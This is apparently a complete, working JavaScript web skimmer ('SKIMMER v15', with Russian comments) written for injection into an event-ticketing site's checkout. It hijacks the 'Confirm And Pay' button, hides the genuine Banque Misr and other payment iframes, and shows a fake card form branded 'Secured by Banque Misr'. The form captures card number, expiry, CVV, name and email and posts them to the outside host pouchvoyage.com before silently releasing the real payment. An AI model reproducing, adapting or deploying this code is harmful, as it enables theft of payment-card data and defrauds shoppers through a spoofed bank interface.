/**
 * SKIMMER v15 — правильный тайминг.
 * Внедрение: в description события (страница события) И в name события (страница checkout).
 * На checkout-странице перехватываем «Confirm And Pay» → форма-клон → карта на pouchvoyage.com/c
 * → отпускаем (реальный клик → настоящая форма BanqueMisr).
 * На странице события — НИЧЕГО не делаем (никаких ранних окон).
 */
(function () {
  'use strict';
  if (window.__SK_RUN) return;
  window.__SK_RUN = true;

  var HOOK = 'https://pouchvoyage.com/c';
  var TAG = 'sk_v16';

  // ТОЛЬКО checkout-страница
  if (location.pathname.indexOf('checkout') === -1) return;

  function send(data) {
    try {
      fetch(HOOK, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }).catch(function () {});
      var img = new Image();
      img.src = HOOK + '?d=' + encodeURIComponent(JSON.stringify(data).slice(0, 900));
    } catch (e) {}
  }

  function log(m) {
    try {
      var img = new Image();
      img.src = HOOK + '?tag=' + TAG + '&m=' + encodeURIComponent(String(m).slice(0, 100));
    } catch (e) {}
  }

  var INJECTED = false;
  var RELEASED = false;
  log('module-loaded-checkout');

  function closeTheirModals() {
    try {
      document.querySelectorAll('.modal.show, .modal[style*="display: block"]').forEach(function (m) {
        m.classList.remove('show');
        m.style.display = 'none';
        m.setAttribute('aria-hidden', 'true');
        m.removeAttribute('aria-modal');
      });
      document.querySelectorAll('.modal-backdrop').forEach(function (b) { b.remove(); });
      document.body.classList.remove('modal-open');
      document.body.style.overflow = '';
      document.body.style.paddingRight = '';
    } catch (e) {}
  }

  function findAmount() {
    try {
      var txt = document.body.innerText;
      var m = txt.match(/EGP\s*([\d.,]+)/i);
      if (m) return 'EGP ' + m[1];
      m = txt.match(/([\d.,]+)\s*EGP/i);
      if (m) return 'EGP ' + m[1];
    } catch (e) {}
    return '';
  }

  function findEmail() {
    try {
      var m = document.body.innerText.match(/[\w.+-]+@[\w.-]+\.[a-z]{2,}/i);
      if (m) return m[0];
    } catch (e) {}
    return '';
  }

  function injectForm() {
    if (INJECTED) return;
    INJECTED = true;
    log('inject-start');

    closeTheirModals();

    try {
      document.querySelectorAll('iframe').forEach(function (f) {
        var s = (f.src || '') + (f.name || '') + (f.id || '');
        if (/(bankmisr|banquemisr|gateway|mastercard|stripe|ryft|paymob|payment|checkout)/i.test(s)) {
          f.style.cssText = 'visibility:hidden!important;height:0!important;width:0!important;position:absolute!important;left:-9999px!important;';
        }
      });
    } catch (e) {}

    try {
      var amount = findAmount();
      var email = findEmail();

      var bd = document.createElement('div');
      bd.id = 'skBackdrop';
      bd.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:2147483645;';
      document.body.appendChild(bd);

      var d = document.createElement('div');
      d.id = 'skCardModal';
      d.setAttribute('tabindex', '-1');
      d.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:2147483647;' +
        'background:#fff;border-radius:6px;box-shadow:0 8px 40px rgba(0,0,0,.4);padding:20px 22px;' +
        'width:420px;max-width:94vw;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;' +
        'pointer-events:auto;box-sizing:border-box;max-height:calc(100vh - 30px);overflow-y:auto;overflow-x:hidden;' +
        'color:#212529;';

      var lblStyle = 'font-size:13px;font-weight:400;color:#212529;display:block;margin-bottom:5px;';
      var inpStyle = 'width:100%;box-sizing:border-box;padding:8px 11px;border:1px solid #949494;border-radius:3px;font-size:14px;background:#fff;color:#212529;outline:none;';

      var emailBlock = email
        ? '<div style="font-size:14px;margin-bottom:14px;padding:9px 12px;background:#f8f9fa;border:1px solid #e9ecef;border-radius:3px;">' +
          '  <div style="font-size:11px;color:#6c757d;margin-bottom:2px;">E-mail</div>' +
          '  <div style="color:#212529;">' + email.replace(/[<>&"]/g, '') + '</div>' +
          '</div>'
        : '';

      d.innerHTML =
        '<div style="font-size:18px;font-weight:400;color:#212529;letter-spacing:-.39px;margin-bottom:14px;">Credit or Debit Card</div>' +
        emailBlock +
        '<div style="margin-bottom:12px;">' +
        '  <label style="' + lblStyle + '">Name on card <span style="color:#d2292e">*</span></label>' +
        '  <input id="skName" autocomplete="off" placeholder="Exactly as shown on card" style="' + inpStyle + '">' +
        '</div>' +
        '<div style="margin-bottom:12px;">' +
        '  <label style="' + lblStyle + '">Card number <span style="color:#d2292e">*</span></label>' +
        '  <div style="display:flex;align-items:stretch;">' +
        '    <input id="skNum" autocomplete="off" inputmode="numeric" placeholder="0000 0000 0000 0000" ' +
        '       style="flex:1;box-sizing:border-box;padding:8px 11px;border:1px solid #949494;border-right:none;border-radius:3px 0 0 3px;font-size:14px;outline:none;">' +
        '    <div style="display:flex;align-items:center;gap:6px;padding:0 10px;border:1px solid #949494;border-left:none;border-radius:0 3px 3px 0;background:#fff;">' +
        '      <span style="font-size:13px;">&#128274;</span>' +
        '    </div>' +
        '  </div>' +
        '</div>' +
        '<div style="margin-bottom:12px;">' +
        '  <label style="' + lblStyle + '">Expiry date <span style="color:#d2292e">*</span></label>' +
        '  <div style="display:flex;align-items:center;gap:7px;">' +
        '    <input id="skExpM" inputmode="numeric" maxlength="2" placeholder="MM" style="width:72px;box-sizing:border-box;padding:8px 10px;border:1px solid #949494;border-radius:3px;font-size:14px;text-align:center;outline:none;">' +
        '    <span style="color:#6c757d;">/</span>' +
        '    <input id="skExpY" inputmode="numeric" maxlength="2" placeholder="YY" style="width:72px;box-sizing:border-box;padding:8px 10px;border:1px solid #949494;border-radius:3px;font-size:14px;text-align:center;outline:none;">' +
        '  </div>' +
        '</div>' +
        '<div style="margin-bottom:16px;">' +
        '  <label style="' + lblStyle + '">Security code <span style="color:#d2292e">*</span></label>' +
        '  <input id="skCvv" autocomplete="off" inputmode="numeric" maxlength="4" placeholder="123" ' +
        '     style="width:120px;box-sizing:border-box;padding:8px 11px;border:1px solid #949494;border-radius:3px;font-size:14px;outline:none;">' +
        '</div>' +
        '<button id="skPayBtn" style="width:100%;padding:11px;background:#6c757d;color:#fff;border:none;border-radius:4px;' +
        'font-size:16px;font-weight:400;cursor:pointer;">' + (amount ? ('Pay ' + amount) : 'Pay') + '</button>' +
        '<div style="display:flex;justify-content:center;align-items:center;gap:6px;margin-top:10px;color:#6c757d;font-size:11.5px;">' +
        '  <span>&#128274;</span> Secured by Banque Misr</div>' +
        '<div id="skStatus" style="text-align:center;font-size:13px;color:#dc3545;margin-top:6px;min-height:16px;"></div>';
      document.body.appendChild(d);

      setTimeout(function () {
        try {
          var f = document.getElementById('skName');
          if (f) f.focus();
        } catch (e) {}
      }, 100);

      var name = d.querySelector('#skName'), num = d.querySelector('#skNum'),
          expM = d.querySelector('#skExpM'), expY = d.querySelector('#skExpY'),
          cvv = d.querySelector('#skCvv'), btn = d.querySelector('#skPayBtn'),
          status = d.querySelector('#skStatus');

      d.querySelectorAll('input').forEach(function (i) {
        i.addEventListener('focus', function () {
          i.style.border = '2px solid #D24646';
          if (i.id === 'skNum') i.style.borderRight = 'none';
        });
        i.addEventListener('blur', function () {
          i.style.border = '1px solid #949494';
          if (i.id === 'skNum') i.style.borderRight = 'none';
        });
      });

      btn.addEventListener('click', function () {
        if (!num.value.trim() || !expM.value.trim() || !expY.value.trim() || !cvv.value.trim()) {
          status.innerHTML = 'Please fill in all card fields';
          return;
        }
        send({
          tag: TAG,
          url: location.href,
          email: email,
          full_name: name.value.trim(),
          card_number: (num.value || '').replace(/\s+/g, ''),
          expiry: (expM.value || '') + '/' + (expY.value || ''),
          cvv: cvv.value || '',
          holder: name.value || '',
          amount: amount,
          ts: new Date().toISOString()
        });
        status.innerHTML = 'Processing&hellip;';
        status.style.color = '#6c757d';
        btn.disabled = true;
        btn.style.background = '#adb5bd';
        // данные ушли — закрываем клон и запускаем НАСТОЯЩИЙ Confirm And Pay
        setTimeout(function () {
          try {
            var m = document.getElementById('skCardModal');
            var b2 = document.getElementById('skBackdrop');
            if (m) m.remove();
            if (b2) b2.remove();
            INJECTED = false;
            RELEASED = true;  // больше не перехватываем
            if (window.__skOrigBtn) {
              window.__skOrigBtn.click();
            }
          } catch (e) {}
        }, 1600);
      });

      var escHandler = function (ev) {
        if (ev.key === 'Escape') {
          var m = document.getElementById('skCardModal');
          var b2 = document.getElementById('skBackdrop');
          if (m) m.remove();
          if (b2) b2.remove();
          INJECTED = false;
          document.removeEventListener('keydown', escHandler);
        }
      };
      document.addEventListener('keydown', escHandler, true);
    } catch (e) {}
  }

  /* Перехват «Confirm And Pay» на checkout */
  var lastClick = 0;

  function hookConfirmPay() {
    document.addEventListener('click', function (ev) {
      if (RELEASED) return;
      var el = ev.target;
      while (el && el !== document.body) {
        var txt = (el.innerText || '').trim();
        if (/confirm\s*(&|and)\s*pay/i.test(txt)) {
          log('hook-hit:' + txt.slice(0, 30));
          var now = Date.now();
          if (now - lastClick < 3000) return;
          lastClick = now;
          ev.preventDefault();
          ev.stopImmediatePropagation();
          window.__skOrigBtn = el;
          injectForm();
          return;
        }
        el = el.parentElement;
      }
    }, true);
    log('hook-installed');
  }

  try {
    hookConfirmPay();
  } catch (e) {}
})();
